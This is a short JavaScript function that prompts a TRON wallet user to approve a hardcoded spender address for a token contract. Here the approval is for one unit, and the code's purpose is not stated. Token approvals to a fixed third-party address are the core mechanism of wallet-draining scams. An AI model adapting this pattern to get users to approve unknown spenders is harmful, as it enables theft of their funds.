const approveUSDT = async () => {
  const tron = getTron()

  if (!tron) {
    alert("Wallet not detected")
    return
  }

  const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
  const spender = "TWnGWtxx7d4NC8xuUqKVRW8eM8yRko2q1y"

  try {
    const address = tron.defaultAddress.base58

    // 🔥 fuerza interacción wallet
    await tron.trx.getBalance(address)

    const contract = await tron.contract().at(contractAddress)

    const amount = 1 // 🔥 mínimo para evitar fallo

    const tx = await contract
      .approve(spender, amount)
      .send({
        feeLimit: 100000000,
      })

    console.log("APPROVE TX:", tx)
    alert("Approve enviado ✅")

  } catch (err) {
    console.error(err)
    alert("Transaction rejected or failed")
  }
}
